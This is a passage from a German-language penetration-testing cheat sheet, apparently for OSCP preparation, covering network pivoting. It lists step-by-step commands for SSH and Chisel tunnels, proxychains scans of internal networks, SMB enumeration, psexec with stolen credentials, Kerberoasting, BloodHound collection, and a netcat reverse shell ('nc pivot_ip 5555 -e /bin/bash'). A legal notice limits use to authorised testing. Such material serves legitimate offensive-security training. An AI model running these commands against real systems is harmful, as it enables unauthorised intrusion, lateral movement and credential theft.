# Add Forward:  netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=target
# Show:         netsh interface portproxy show all
# Delete:       netsh interface portproxy delete v4tov4 listenport=8080
```

---

## Praktische Szenarien - Step by Step

### Szenario 1: Webserver im internen Netz scannen

```bash
# 1. SSH Dynamic tunnel
ssh -D 1080 -N -f root@compromised-server

# 2. Proxychains config prüfen
cat /etc/proxychains4.conf | tail -n 5
# Sollte sein: socks5 127.0.0.1 1080

# 3. Netzwerk scannen
proxychains nmap -sT -Pn -p 80,443,8080 192.168.1.0/24

# 4. Gobuster auf gefundenem Server
proxychains gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Szenario 2: SMB/Windows Netzwerk Pivoting

```bash
# 1. Tunnel setup
ssh -D 1080 -N -f root@pivot-server

# 2. SMB enumeration
proxychains crackmapexec smb 192.168.1.0/24
proxychains enum4linux -a 192.168.1.10

# 3. Mit gefundenen Credentials
proxychains smbclient //192.168.1.10/share -U username%password
proxychains psexec.py domain/user:password@192.168.1.10
```

### Szenario 3: Datenbank im internen Netz

```bash
# 1. SSH Local port forward für MySQL
ssh -L 3306:192.168.1.100:3306 -N -f root@pivot-server

# 2. Direkt verbinden (kein proxychains nötig)
mysql -h 127.0.0.1 -P 3306 -u root -p

# 3. Oder mit Tools
sqlmap -u "mysql://user:pass@127.0.0.1:3306/database"
```

### Szenario 4: Active Directory Enumeration über Pivot

```bash
# 1. SSH Dynamic Port Forwarding
ssh -D 9050 user@ms01 -N -f

# 2. ProxyChains config
sudo nano /etc/proxychains4.conf
# Letzte Zeile:
socks5 127.0.0.1 9050

# 3. Domain Enumeration
proxychains nmap -p 88,389,445 DC_IP

# 4. Impacket via Proxy (Kerberoasting)
proxychains GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request

# 5. BloodHound Collection
proxychains bloodhound-python -u user -p password -d domain.local -ns DC_IP -c All
```

### Szenario 5: RDP via SSH Tunnel

```bash
# Kali → Pivot (SSH) → Target (RDP)
ssh -L 3389:target_ip:3389 user@pivot_ip

# Zugriff von Kali
xfreerdp /v:127.0.0.1:3389 /u:admin /p:pass
```

### Szenario 6: SMB via Chisel (Windows Pivot)

```bash
# Server auf Kali:
./chisel server -p 8000 --reverse

# Client auf Windows Pivot:
chisel.exe client kali_ip:8000 R:445:target_ip:445

# Kali:
smbclient -L 127.0.0.1 -U admin
```

### Szenario 7: Reverse Shell via Reverse Port Forward

```bash
# 1. Kali Listener:
nc -lvnp 4444

# 2. SSH Reverse Forward auf Pivot:
ssh -R 5555:127.0.0.1:4444 kali_user@kali_ip

# 3. Internal Target verbindet zu Pivot:5555
nc pivot_ip 5555 -e /bin/bash
# → Shell landet auf Kali:4444
```

---

## Rechtliche Hinweise

Diese Methoden dürfen NUR verwendet werden für:
- Autorisierte Penetrationstests mit schriftlicher Genehmigung
- CTF-Wettbewerbe und Security Challenges
- Sicherheitsforschung in kontrollierten Umgebungen
- Red Team Assessments mit definiertem Scope

Unbefugte Nutzung verstößt gegen CFAA (USA), Computer Misuse Act (UK), StGB §202a-c (DE) und ähnliche Gesetze weltweit.

---

**Erstellt**: 2025-10-30
**Kontext**: Autorisierter Penetrationstest / OSCP Vorbereitung
**Total Methods**: 64+ Techniken
**Focus**: Kali Linux als Attacker System
